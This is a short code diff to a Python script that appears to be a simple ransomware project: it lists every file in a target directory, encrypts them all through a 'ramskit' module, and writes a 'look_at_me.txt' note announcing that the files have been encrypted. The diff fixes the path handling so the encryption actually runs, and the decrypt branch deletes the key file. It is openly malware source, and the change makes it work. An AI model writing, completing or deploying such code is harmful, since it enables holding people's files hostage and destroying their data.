@@ -43,25 +43,26 @@ def main() -> None:
     # FIXME 2: Encrypt/decrypt
     if action == 'encrypt':
         items = os.listdir(path)
-        full_path = [path + '/' + item for item in items] if operating_system  == 'linux' else [path + '\\' + item for item in items]
 
         # Just if list comprehension does not work as expected
-        '''
         if operating_system == 'linux':
             full_path = [path + '/' + item for item in items]
+            with open(path + '/' + 'look_at_me.txt', 'w') as f:
+                f.write('''
+                    Heyo, this file has been encrypted!. \n\n
+                ''')
         elif operating_system == 'windows':
             full_path = [path + '\\' + item for item in items]
+            with open(path + '\\' + 'look_at_me.txt', 'w') as f:
+                f.write('''
+                    Heyo, this file has been encrypted!. \n\n
+                ''')
         else:
             print("[x] No OS typed. Exiting...")
-            sys.exit(0)'''
+            sys.exit(0)
 
+        ramskit.encrypt_file(full_path, key)
 
-        # It needs changes here
-        with open(file, 'w') as f:
-            f.write('''
-                Heyo, this file has been encrypted!. \n\n
-            ''')
-        ramskit.encrypt_file(items, key)
     elif action == 'decrypt':
         # FIXME 4: Check and fix key
         os.remove(key)
